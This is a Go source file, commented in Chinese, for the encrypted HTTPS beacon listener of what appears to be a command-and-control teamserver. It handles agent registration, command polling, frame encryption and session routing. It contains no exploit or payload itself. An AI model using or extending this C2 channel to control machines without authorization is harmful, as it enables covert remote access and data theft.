// Package beacon 多传输(beacon)通道的服务端 listener。
// HTTPS/DNS/ICMP 均为"请求驱动"通道: 无长连接, 每次交互独立; 出站命令帧进会话 outbox。
// 下行取件(节拍合一): GET /api/check?m=<身份块> 为取件端点(响应体 = Encrypt(一帧)),
// POST 上行经响应体带回的旧路径暂留作 Agent 未升级期的兼容(见 Upload 注释), A 批切换后收缩。
//
// 线上契约见 通信协议文档.md(节拍合一 S2.4' 后的最终形态):
//
//	HTTPS GET : 无 m= → 探活 200 空; 带 m= → 身份块取件(响应体 = Encrypt(一帧), 空 = 无帧)。
//	HTTPS POST: body = Encrypt(frame); **响应体恒空**(纯上行, 与 CS 的 POST 语义一致)。
package beacon

import (
	"encoding/binary"
	"encoding/json"
	"io"
	"log"
	"net/http"

	"cleat/teamserver/internal/crypto"
	"cleat/teamserver/internal/session"
)

// Handler 是 beacon(HTTPS) listener 的 HTTP 处理器。
// 加密二选一: cbox(PSK) 或 xbox(X25519 握手, 优先); 均 nil = 明文模式。
type Handler struct {
	mgr    *session.Manager
	cbox   *crypto.Box
	xbox   *crypto.X25519Box
	nonces nonceGuard // GET 身份块防重放(见 identity.go)
}

// New 创建 beacon Handler。
func New(mgr *session.Manager, cbox *crypto.Box, xbox *crypto.X25519Box) *Handler {
	return &Handler{mgr: mgr, cbox: cbox, xbox: xbox}
}

// Upload 返回 POST 上传处理器: 解密一帧 → 会话路由处理 → 响应体带回一条 outbox 命令。
func (h *Handler) Upload() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		body, err := io.ReadAll(io.LimitReader(r.Body, 64*1024*1024))
		if err != nil || len(body) == 0 {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		// X25519 握手帧(明文 "KE"+key_id+eph_pub): 派生会话密钥并登记, 200 空响应
		if h.xbox != nil && h.xbox.Handshake(body) {
			// 观测点: 确认 KE 帧是否到达 beacon 通道(迁移 E2E 关键证据)
			keKeyID := uint64(0)
			if len(body) >= 10 {
				keKeyID = binary.BigEndian.Uint64(body[2:10])
			}
			log.Printf("[beacon][KE] 握手帧已消费 key_id=%d len=%d from %s\n",
				keKeyID, len(body), r.RemoteAddr)
			w.WriteHeader(http.StatusOK)
			return
		}
		frame, keyID, err := h.decrypt(body)
		if err != nil {
			log.Printf("[beacon] decrypt fail: %v (body len=%d)\n", err, len(body))
			w.WriteHeader(http.StatusBadRequest)
			return
		}

		sid := frameSessionID(frame)
		remoteIP := r.RemoteAddr
		// 通道类型按连接的 TLS 状态定性(见 transportFor): TLS → https, 明文 → http。
		next, err := h.mgr.BeaconFrame(remoteIP, sid, frame, transportFor(r))
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}

		// POST 纯上行(节拍合一 S2.4'): 响应体恒空 —— 下行唯一路径 = GET 身份块取件。
		// **唯一例外 = 注册帧**: Agent 首次
		// 注册前**无 mid 无 sid**, GET 只能是裸探活(200 空), confirm 无 GET 路径可取;
		// 故 FirstConnect 的 confirm 必须经 POST 响应体带回(与 GET 取件互斥, 不构成
		// 第二下行路径)。其余一切 POST 恒空。
		if next != nil && session.IsRegistrationFrame(frame) {
			if cf, ok := next.PollOutbox(); ok {
				enc, e := h.encrypt(keyID, cf)
				if e != nil {
					log.Printf("[beacon] 注册 confirm 加密失败: %v\n", e)
					w.WriteHeader(http.StatusInternalServerError)
					return
				}
				w.Header().Set("Content-Type", "application/octet-stream")
				_, _ = w.Write(enc)
				return
			}
		}
		w.WriteHeader(http.StatusOK)
	}
}

// Poll 返回 GET 处理器(节拍合一): 探活护栏 + 身份块取件端点。
//
//	无 m=      → 200 空(探活护栏: 旧 Agent / 裸探活 / 负载均衡健康检查不受影响)
//	身份块非法  → 400(**不静默降级为"无命令"** —— 身份坏与无命令必须可区分, 否则故障被掩盖)
//	合法       → BeaconGet: mid 认领 / sid 路由(含重启复活) / 未知 → "重新注册"帧,
//	             outbox 队首帧经响应体带回(空 = 200 空); X25519 模式响应与请求同 key_id。
//
// 注册期时序( 承重结构): FirstConnect 后 confirm 只能经 GET 带回(POST 将变纯上行),
// 因此 Agent 未注册期必须走 1s 快速档(已落地, 5f808f9), 否则 8s 确认等待窗必然超时。
func (h *Handler) Poll() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		mParam := r.URL.Query().Get("m")
		if mParam == "" {
			w.WriteHeader(http.StatusOK)
			return
		}
		ident, err := h.parseIdentityBlock(mParam)
		if err != nil {
			log.Printf("[beacon] poll GET 身份块非法 from %s: %v\n", r.RemoteAddr, err)
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		// 通道类型按连接的 TLS 状态定性(取件同样落在该 beacon 会话上)。
		respFrame := h.mgr.BeaconGet(r.RemoteAddr, ident.MachineID, ident.SID, transportFor(r))
		if len(respFrame) > 0 {
			log.Printf("[beacon] GET sid=%d mid=%q -> 帧已交付(%dB) from %s",
				ident.SID, ident.MachineID, len(respFrame), r.RemoteAddr)
			enc, e := h.encrypt(ident.KeyID, respFrame)
			if e != nil {
				log.Printf("[beacon] poll GET 响应加密失败: %v\n", e)
				w.WriteHeader(http.StatusInternalServerError)
				return
			}
			w.Header().Set("Content-Type", "application/octet-stream")
			_, _ = w.Write(enc)
			return
		}
		w.WriteHeader(http.StatusOK) // 200 空 body: 无帧
	}
}

// decrypt 解帧: 返回明文帧 + 该帧的 key_id(X25519 模式; PSK/明文为 0)。
func (h *Handler) decrypt(body []byte) ([]byte, uint64, error) {
	if h.xbox != nil {
		frame, err := h.xbox.DecryptFrame(body)
		if err != nil {
			return nil, 0, err
		}
		return frame, binary.BigEndian.Uint64(body[:8]), nil
	}
	if h.cbox != nil {
		frame, err := h.cbox.Decrypt(body)
		return frame, 0, err
	}
	return body, 0, nil
}

// encrypt 加密帧(命令出站; 与请求同 key_id)。
func (h *Handler) encrypt(keyID uint64, frame []byte) ([]byte, error) {
	if h.xbox != nil {
		return h.xbox.EncryptForKeyID(keyID, frame)
	}
	if h.cbox != nil {
		return h.cbox.Encrypt(frame)
	}
	return frame, nil
}

// frameSessionID 从明文帧提取 session_id(优先顶层, 再 params, 再 data); 无则 0。
//
// 混合帧(JSON头 + '\0' + 二进制体, 流数据/文件传输)必须先拆头再解析 —— 此前本函数
// 在 BeaconFrame 入口被调用(早于 handleOne 的混合帧分流)时直接整帧 Unmarshal, Go 的
// encoding/json 遇顶层裸 NUL 直接报错, 于是每一帧流数据都以 sid=0 进会话路由 →
// 建临时会话 → 匿名注册(实测 HTTPS poll 下一次远程桌面开出几十个匿名会话, #99→#113)。
// 现统一走 session.SplitFrame(全仓唯一拆帧权威), 路由入口与会话层共用同一实现,
// 不再各自维护截断逻辑。
func frameSessionID(frame []byte) int {
	header, _, err := session.SplitFrame(frame)
	if err != nil {
		return 0
	}
	var m map[string]interface{}
	if err := json.Unmarshal(header, &m); err != nil {
		return 0
	}
	if v, ok := numID(m["session_id"]); ok {
		return v
	}
	for _, key := range []string{"params", "data"} {
		if mm, ok := m[key].(map[string]interface{}); ok {
			if v, ok := numID(mm["session_id"]); ok {
				return v
			}
		}
	}
	return 0
}

// numID 把 JSON 数字解析为会话 ID。
func numID(v interface{}) (int, bool) {
	switch n := v.(type) {
	case float64:
		return int(n), true
	case int64:
		return int(n), true
	case int:
		return n, true
	}
	return 0, false
}

// transportFor 按连接是否走 TLS 定性 beacon 通道类型: TLS → "https", 明文 → "http"。
//
// 与 listener 定性一致(manager_start.go: AddHTTPSListener 在 tlsCfg==nil 时 proto="http")。
// 取请求级 r.TLS 而非查 listener.protocol, 是因为同一个 Handler 实例可挂在不同 listener 上
// (main.go / service/listener.go 均复用同一 bh), 请求自带的事实最准、且零透传。
func transportFor(r *http.Request) string {
	if r.TLS != nil {
		return "https"
	}
	return "http"
}
